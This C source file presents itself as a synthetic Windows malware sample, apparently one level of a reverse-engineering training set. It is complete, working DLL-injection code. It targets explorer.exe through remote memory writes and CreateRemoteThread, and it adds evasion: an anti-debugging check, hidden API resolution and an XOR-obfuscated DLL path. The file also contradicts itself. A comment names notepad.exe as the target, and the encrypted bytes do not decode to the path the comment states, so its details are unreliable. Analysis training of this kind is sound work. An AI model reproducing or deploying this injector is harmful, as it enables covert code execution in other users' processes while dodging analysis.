/*
 * windows_level14_DLLInjection.c
 *
 * Synthetic Windows PE sample — DLL injection via CreateRemoteThread + LoadLibraryA.
 * Techniques: XOR-encrypted DLL path string, manual GetProcAddress resolution, 
 * anti-debugging (IsDebuggerPresent), VirtualAllocEx/WriteProcessMemory injection.
 *
 * Compile (MinGW cross or MSVC):
 *   x86_64-w64-mingw32-gcc -O0 -static -o windows_level14_DLLInjection.exe windows_level14_DLLInjection.c
 *   cl /O0 /MT windows_level14_DLLInjection.c /Fe:windows_level14_DLLInjection.exe
 */

#define _WIN32_WINNT 0x0600
#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

/* ================================================================
 * XOR key for DLL path decryption (8 bytes, repeated)
 * ================================================================ */
static const unsigned char g_xor_key[] = {
    0x5A, 0x3C, 0x7F, 0xE1, 0x2D, 0x94, 0xB8, 0x6A
};
#define XOR_KEY_LEN 8

/* ================================================================
 * Encrypted DLL path string — "C:\\Windows\\Temp\\payload.dll"
 * ================================================================ */
static unsigned char g_encrypted_dll_path[] = {
    0x13, 0x6F, 0x55, 0x89, 0x4D, 0xA0, 0x9D, 0x41,
    0x67, 0x0D, 0x52, 0xA0, 0x45, 0x9C, 0xE0, 0x0A,
    0x37, 0x0E, 0x52, 0xA0, 0x59, 0xFC, 0xEF, 0x05,
    0x37, 0x7E, 0x47, 0x89, 0x43, 0xF5, 0xD5, 0x00
};
#define ENC_DLL_PATH_LEN 32

/* ================================================================
 * XOR decryption routine
 * ================================================================ */
static void xor_decrypt(unsigned char *buf, int len, const unsigned char *key, int key_len) {
    int i;
    for (i = 0; i < len; i++) {
        buf[i] ^= key[i % key_len];
    }
}

/* ================================================================
 * Manual GetProcAddress — resolve kernel32.dll exports without
 * calling GetProcAddress directly (hides from static IAT analysis).
 * ================================================================ */
static FARPROC manual_get_proc(HMODULE hMod, const char *funcName) {
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;

    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    IMAGE_DATA_DIRECTORY expDir = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (expDir.VirtualAddress == 0) return NULL;

    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hMod + expDir.VirtualAddress);
    DWORD *nameRvas = (DWORD *)((BYTE *)hMod + pExp->AddressOfNames);
    WORD *ordRvas  = (WORD *)((BYTE *)hMod + pExp->AddressOfNameOrdinals);
    DWORD *funcRvas = (DWORD *)((BYTE *)hMod + pExp->AddressOfFunctions);

    DWORD i;
    for (i = 0; i < pExp->NumberOfNames; i++) {
        const char *name = (const char *)((BYTE *)hMod + nameRvas[i]);
        if (strcmp(name, funcName) == 0) {
            return (FARPROC)((BYTE *)hMod + funcRvas[ordRvas[i]]);
        }
    }
    return NULL;
}

/* ================================================================
 * Anti-debugging: IsDebuggerPresent check
 * ================================================================ */
static int anti_debug_check(void) {
    /* Use IsDebuggerPresent via PEB directly to avoid simple patches */
    PPEB pPeb;
#ifdef _WIN64
    pPeb = (PPEB)__readgsqword(0x60);
#else
    pPeb = (PPEB)__readfsdword(0x30);
#endif
    if (pPeb->BeingDebugged) {
        return 1;
    }
    return 0;
}

/* ================================================================
 * DLL injection via CreateRemoteThread
 * Target: notepad.exe (synthetic — won't actually run without real payload)
 * ================================================================ */
static int inject_dll(const char *dllPath) {
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (!hKernel32) return -1;

    /* Manual resolution to avoid IAT entries */
    typedef HANDLE (WINAPI *pCreateToolhelp32Snapshot)(DWORD, DWORD);
    typedef BOOL (WINAPI *pProcess32First)(HANDLE, LPPROCESSENTRY32);
    typedef BOOL (WINAPI *pProcess32Next)(HANDLE, LPPROCESSENTRY32);
    typedef HANDLE (WINAPI *pOpenProcess)(DWORD, BOOL, DWORD);
    typedef LPVOID (WINAPI *pVirtualAllocEx)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
    typedef BOOL (WINAPI *pWriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *);
    typedef HANDLE (WINAPI *pCreateRemoteThread)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T,
        LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
    typedef BOOL (WINAPI *pCloseHandle)(HANDLE);
    typedef DWORD (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);

    pCreateToolhelp32Snapshot _snap = (pCreateToolhelp32Snapshot)
        manual_get_proc(hKernel32, "CreateToolhelp32Snapshot");
    pProcess32First _p32f = (pProcess32First)
        manual_get_proc(hKernel32, "Process32First");
    pProcess32Next _p32n = (pProcess32Next)
        manual_get_proc(hKernel32, "Process32Next");
    pOpenProcess _op = (pOpenProcess)
        manual_get_proc(hKernel32, "OpenProcess");
    pVirtualAllocEx _vaex = (pVirtualAllocEx)
        manual_get_proc(hKernel32, "VirtualAllocEx");
    pWriteProcessMemory _wpm = (pWriteProcessMemory)
        manual_get_proc(hKernel32, "WriteProcessMemory");
    pCreateRemoteThread _crt = (pCreateRemoteThread)
        manual_get_proc(hKernel32, "CreateRemoteThread");
    pCloseHandle _ch = (pCloseHandle)
        manual_get_proc(hKernel32, "CloseHandle");
    pWaitForSingleObject _wfso = (pWaitForSingleObject)
        manual_get_proc(hKernel32, "WaitForSingleObject");

    if (!_snap || !_p32f || !_op || !_vaex || !_wpm || !_crt) return -1;

    /* Find target process (explorer.exe) */
    HANDLE hSnap = _snap(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return -1;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    DWORD targetPid = 0;
    if (_p32f(hSnap, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, "explorer.exe") == 0) {
                targetPid = pe32.th32ProcessID;
                break;
            }
        } while (_p32n != NULL && _p32n(hSnap, &pe32));
    }
    _ch(hSnap);
    if (targetPid == 0) return -1;

    /* Open target process */
    HANDLE hProcess = _op(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                          PROCESS_VM_WRITE | PROCESS_QUERY_INFORMATION,
                          FALSE, targetPid);
    if (!hProcess) return -1;

    /* Allocate memory for DLL path */
    SIZE_T pathLen = strlen(dllPath) + 1;
    LPVOID pRemoteMem = _vaex(hProcess, NULL, pathLen,
                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pRemoteMem) { _ch(hProcess); return -1; }

    /* Write DLL path to remote process */
    SIZE_T written = 0;
    if (!_wpm(hProcess, pRemoteMem, dllPath, pathLen, &written)) {
        _ch(hProcess); return -1;
    }

    /* Resolve LoadLibraryA address in remote process (same address — kernel32 in same location) */
    LPTHREAD_START_ROUTINE pLoadLibrary = (LPTHREAD_START_ROUTINE)
        manual_get_proc(hKernel32, "LoadLibraryA");
    if (!pLoadLibrary) { _ch(hProcess); return -1; }

    /* Create remote thread to load the DLL */
    HANDLE hThread = _crt(hProcess, NULL, 0, pLoadLibrary, pRemoteMem, 0, NULL);
    if (!hThread) { _ch(hProcess); return -1; }

    _wfso(hThread, INFINITE);
    _ch(hThread);
    _ch(hProcess);
    return 0;
}

/* ================================================================
 * Main entry point
 * ================================================================ */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                   LPSTR lpCmdLine, int nShowCmd) {
    /* Anti-debugging check */
    if (anti_debug_check()) {
        return 0;
    }

    /* Decrypt DLL path */
    char dllPath[ENC_DLL_PATH_LEN + 1];
    memcpy(dllPath, g_encrypted_dll_path, ENC_DLL_PATH_LEN);
    xor_decrypt((unsigned char *)dllPath, ENC_DLL_PATH_LEN, g_xor_key, XOR_KEY_LEN);
    dllPath[ENC_DLL_PATH_LEN] = '\0';

    /* Perform DLL injection */
    inject_dll(dllPath);

    /* Synthetic: wait briefly and exit — real malware would persist */
    Sleep(1000);
    return 0;
}
